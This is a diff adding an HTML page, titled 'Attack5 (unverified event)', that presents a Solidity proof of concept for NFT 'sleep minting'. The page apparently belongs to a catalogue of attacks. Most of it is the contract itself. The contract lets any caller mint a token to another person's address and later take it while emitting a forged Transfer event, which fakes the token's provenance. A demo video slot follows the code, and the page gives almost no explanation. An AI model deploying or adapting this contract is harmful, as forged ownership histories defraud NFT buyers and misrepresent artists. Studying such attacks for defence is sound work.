@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attack5 (unverified event)</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        h1 { color: navy; }
+        .section { margin-bottom: 20px; }
+        .code-block { background-color: #f4f4f4; padding: 10px; }
+        .section img, .section video, .section iframe { width: 100%; max-width: 600px; height: auto; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h1>Attack5 (unverified event) </h1>
+
+    <div class="section">
+        <h2>POC Code</h2>
+        <pre class="code-block"><code>
+            // SPDX-License-Identifier: MIT
+            pragma solidity ^0.8.0;
+            
+            import "https://github.com/nibbstack/erc721/src/contracts/tokens/nf-token-metadata.sol";
+            import "https://github.com/nibbstack/erc721/src/contracts/ownership/ownable.sol";
+            
+            contract MyArtSale is
+              NFTokenMetadata,
+              Ownable
+            {
+            
+            
+              constructor()
+              {
+                nftName = "Phantom";
+                nftSymbol = "Phantom";
+              }
+            
+            
+                function sleepMint(address originalOwner,uint256 tokenId) public {
+                    super._mint(originalOwner, tokenId);
+            
+                }
+            
+                function sleep_transfer(address originalOwner,uint256 id) public
+                {
+                    super._transfer(msg.sender, id);
+                    emit Transfer(originalOwner,msg.sender,id);
+                }
+            }
+            
+        </code></pre>
+    </div>
+
+    <div class="section">
+        <h2>Demo Video</h2>
+        <video controls>
+            <source src="demo-video.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+
+        <!-- <iframe src="https://www.youtube.com/embed/" frameborder="0" allowfullscreen></iframe> -->
+    </div>
+</body>
+</html>
